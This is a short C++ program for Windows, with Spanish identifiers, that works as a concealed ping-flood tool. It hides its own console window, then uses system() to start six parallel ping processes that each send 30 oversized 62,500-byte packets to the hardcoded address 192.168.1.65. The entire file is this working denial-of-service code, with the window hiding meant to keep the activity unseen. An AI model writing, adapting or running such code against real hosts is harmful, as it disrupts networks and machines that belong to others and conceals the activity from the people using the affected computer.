#include<iostream>
#include<string.h>
#include<windows.h>

using namespace std;

string texto();
void hideW();

int main(void){
	hideW();
	
	string txt = texto();
	const char *command = txt.c_str();
	system(command);
	
	return 0;		
}


string texto(){
	string IP = "ping 192.168.1.65 -n 30 -l 62500";
	string nuevo = "start";
	string ejec = "&";
	string esp = " ";
	string comando, comandoY;
	int n = 5;
	
	for (int i=0; i<=n; i++){
		comando = nuevo + esp + IP + esp; 
		if (i<n){
			comando = comando + ejec + esp;
		}		
		
		comandoY += comando;
	}
	return comandoY;
}

void hideW(){
	HWND window;
	AllocConsole();
	window = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(window, 0);
}

	
	
